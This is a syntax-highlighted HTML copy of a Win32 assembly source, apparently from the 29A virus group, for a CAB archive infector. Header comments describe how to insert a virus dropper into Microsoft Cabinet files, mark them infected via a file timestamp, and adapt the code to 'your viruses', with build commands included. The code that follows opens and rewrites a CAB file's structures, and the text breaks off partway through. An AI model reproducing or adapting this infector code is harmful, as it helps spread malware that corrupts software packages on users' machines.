<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>cab_drop.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÍÍÍÍÍÍÍÍÄÄÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÄÄÍÍÍÍÍÍÍÍÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  : Prizzy/29A :   Infection Microsoft CAB archive       : Prizzy/29A :</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÍÍÍÍÍÍÍÍÄÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÄÄÍÍÍÍÍÍÍÍÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;              made in the Czech Republic</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   The discovering of new VX technics is self-evidence. So, let us see how</span><span class="sc0">
</span><span class="sc1">;   to infect Microsoft Cabinet File Format (CAB).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1. Technical Description</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   Cabinet files  are compressed  packages containing  a number of related</span><span class="sc0">
</span><span class="sc1">;   files. The format  of  cabinet file  supports  a number of  compression</span><span class="sc0">
</span><span class="sc1">;   formats, including MSZIP, LZX, Quantum, or uncompressed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   1.1. Specification</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   Each file stored in a cabinet file is stored completely within a single</span><span class="sc0">
</span><span class="sc1">;   folder. A cabinet file  may contain one or more folders.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   A cabinet file contains a cabinet header (CFHEADER), followed by one or</span><span class="sc0">
</span><span class="sc1">;   more cabinet folder (CFFOLDER) entries, a series of one or more cabinet</span><span class="sc0">
</span><span class="sc1">;   file (CFFILE) entries, and  the actual  compressed file data  in CFDATA</span><span class="sc0">
</span><span class="sc1">;   entries. The compression file data in the CFDATA entry is stored in one</span><span class="sc0">
</span><span class="sc1">;   of several compression formats.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   2. Cabinet infection</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   When this program opened any CAB file, read header, make this checking:</span><span class="sc0">
</span><span class="sc1">;   * compare CAB indetification "MSCF"</span><span class="sc0">
</span><span class="sc1">;   * get CAB version, if it's different then 0x0103, then exit</span><span class="sc0">
</span><span class="sc1">;   * get CAB volume number - only the first cabinet</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Then it calculate offset of the first file struct (over CABh_FirstRec),</span><span class="sc0">
</span><span class="sc1">;   and read its time,  if it is 0x4924 then cabinet has been infected yet.</span><span class="sc0">
</span><span class="sc1">;   Well, on this place I must write I could not  find other way how to get</span><span class="sc0">
</span><span class="sc1">;   whether cabinet  file is infected (but never change CABh_ID  because of</span><span class="sc0">
</span><span class="sc1">;   extraction program which will have some problems).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   To change compression type (to stored)  I must insert new  folder which</span><span class="sc0">
</span><span class="sc1">;   it contains compression type. I find out  number of files and by random</span><span class="sc0">
</span><span class="sc1">;   generator I'll get new file struct position in CAB. And 'cause all file</span><span class="sc0">
</span><span class="sc1">;   structs and folders are in the beginning of file,  I must allocate free</span><span class="sc0">
</span><span class="sc1">;   memory (through  VirtualAlloc)  and  copy "whole" file  there.  Then  I</span><span class="sc0">
</span><span class="sc1">;   create new entry and I'll wrote it in the end of file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   3. Very, very stupid Microsoft Cabinet File Format</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   This is the worst program which I coded so far. Since so stupidly built</span><span class="sc0">
</span><span class="sc1">;   archive format I have  never seen  before. All formats  which  has been</span><span class="sc0">
</span><span class="sc1">;   created by Microsoft are idiotic (like is their macro files - Word,HLP)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      * To change compression type I must include new folder - although it</span><span class="sc0">
</span><span class="sc1">;    can be at file struct</span><span class="sc0">
</span><span class="sc1">;      * In the file structure has uncomprerssed file offset and because of</span><span class="sc0">
</span><span class="sc1">;    this different information (all archivez has compressed file offs)</span><span class="sc0">
</span><span class="sc1">;    I couldn't store my dropper inside CAB file</span><span class="sc0">
</span><span class="sc1">;      * This format don't support fully CRC - yes, it can be, or not</span><span class="sc0">
</span><span class="sc1">;      * Its compressed data is stored in several parts (too stupid)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   4. Limitation this CAB infector</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   The first and the latest thing is CAB file size must be lesser then 5Mb</span><span class="sc0">
</span><span class="sc1">;   Since I must copy this size to buffer and back to CAB file. It's 'cause</span><span class="sc0">
</span><span class="sc1">;   of "uncompressed file offset" as I wrote above. Although, I successfuly</span><span class="sc0">
</span><span class="sc1">;   infected Microsoft Plus! 98 cabinet file (PLUS98.CAB - 97,440 megabyte)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   5. What do for compatibility with your viruses</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   Make this changes:</span><span class="sc0">
</span><span class="sc1">;   * change name of your CAB file: standard is "rb000.cab" which you</span><span class="sc0">
</span><span class="sc1">;     can found in "\WINDOWS\SYSBCKUP" but only under Win98 (maybe)</span><span class="sc0">
</span><span class="sc1">;   * change DropperSize on your real virus size</span><span class="sc0">
</span><span class="sc1">;   * change my random_number_generator on yours</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   6. Intending under these technics</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   I successfuly infected ARJ,ZIP,LHA,PAK - RAR/ACE in my Win9x.Prizzy and</span><span class="sc0">
</span><span class="sc1">;   now it is Microsoft Cabinet File (CAB). What will  be next ? I will say</span><span class="sc0">
</span><span class="sc1">;   you it. All these archive infections has one bug. Your virus dropper is</span><span class="sc0">
</span><span class="sc1">;   in stored compression type and dropper is stored (mostly) in the end of</span><span class="sc0">
</span><span class="sc1">;   file. Do you think it will be difficult to compress your dropper ? No ,</span><span class="sc0">
</span><span class="sc1">;   whether you use what have user in the computer (use proper DLL library)</span><span class="sc0">
</span><span class="sc1">;   For RAR it won't problem, for ACE too, CAB not at all - so what's over?</span><span class="sc0">
</span><span class="sc1">;   Maybe you know it but ACE is mostly use in warez scene - it's future !!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Whether anyone (preferably 29A member) would like to build this dropper</span><span class="sc0">
</span><span class="sc1">;   write me and I will help you - as far as I will time ('cause of school)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   7. Compiling it</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;     tasm32 -ml -m5 -q -zn cab_drop.asm</span><span class="sc0">
</span><span class="sc1">;     tlink32 -Tpe -c -x -aa cab_drop,,, import32</span><span class="sc0">
</span><span class="sc1">;     pewrsec cab_drop.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc2">.386p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">Win32API.inc</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc1">;file operations</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">WriteFile</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">SetFilePointer</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualAlloc</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">VirtualFree</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ prepare to program start ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some global's data ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">COMPARE_BY_TIME</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">see_above_what_this_mean</span><span class="sc0">

</span><span class="sc5">HeaderSize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">65536</span><span class="sc0">           </span><span class="sc1">;for header+files</span><span class="sc0">
</span><span class="sc5">DropperSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">Error_Message</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Title_Message</span><span class="sc0">
</span><span class="sc5">DropperFullSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">CABe_Compr_data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
            </span><span class="sc5">DropperSize</span><span class="sc0">

</span><span class="sc5">ArchiveName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'rb000.cab'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;any .CAB file</span><span class="sc0">

</span><span class="sc5">FileHandle</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;handle of the opened file</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;for moving in file</span><span class="sc0">
</span><span class="sc5">FileHeaderSize</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;real size of CAB header</span><span class="sc0">

</span><span class="sc5">Title_Message</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'CAB infector - (c)oded by Prizzy/29A'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Error_Message</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Operation failed.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Success_Message</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Micro$oft Cabinet File has been infected...'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">cab_buffer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;CAB file in memory</span><span class="sc0">
</span><span class="sc5">mem_buffer</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;place in memory</span><span class="sc0">
</span><span class="sc5">last_error</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">my_Folder</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;offset of my new folder</span><span class="sc0">
</span><span class="sc5">my_File</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;offset of my file struct</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ program starts here ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">cabinet_dropper</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; at first we will open archive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ArchiveName</span><span class="sc0">
        </span><span class="sc5">@OpenFile</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;success ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cab_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;save handle</span><span class="sc0">

        </span><span class="sc1">; get file size</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;bigger then 2^64-2 ?</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; allocate memory</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">DropperFullSize</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__malloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">mem_buffer</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; real file size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHeaderSize</span><span class="sc4">],</span><span class="sc5">HeaderSize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileSize</span><span class="sc4">],</span><span class="sc5">HeaderSize</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">__cab_read</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">FileSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">FileHeaderSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; read header+all files structs</span><span class="sc0">
    </span><span class="sc5">__cab_read</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">last_error</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHeaderSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">mem_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadFile</span><span class="sc0">

        </span><span class="sc1">; check CAB archive</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">mem_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc12">'FCSM'</span><span class="sc0">        </span><span class="sc1">;"MSCF" signature ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cab_error</span><span class="sc0">     </span><span class="sc1">;exit without dealloc !!</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_VersionMin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">),</span><span class="sc2">0103h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cab_error</span><span class="sc0">

        </span><span class="sc1">; get volume number - I want only 1st volume</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_Number</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">),</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cab_error</span><span class="sc0">

        </span><span class="sc1">; CAB infected ? - check time of the 1st entry</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_FirstRec</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">mem_buffer</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">COMPARE_BY_TIME</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABf_Time</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">),</span><span class="sc2">4924h</span><span class="sc0">  </span><span class="sc1">;9:9:9 ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cab_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABf_Time</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">),</span><span class="sc2">4924h</span><span class="sc0">  </span><span class="sc1">;new time</span><span class="sc0">
    </span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc1">; modify folder's starts</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_nFolders</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">__cab_modify</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cab_modified</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABd_FirstRec</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">),</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cab_modify</span><span class="sc0">
    </span><span class="sc5">__cab_modified</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc1">; make place for new folder</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">FileHeaderSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">mem_buffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__movsd_back</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc1">; save offset - ESI=place of the new folder</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">my_Folder</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">     </span><span class="sc1">;modify later</span><span class="sc0">

        </span><span class="sc1">; get number of files</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_nFiles</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_header_start</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__rnd_number</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc1">; modify all file structs in CAB archive - wow</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,(</span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0">
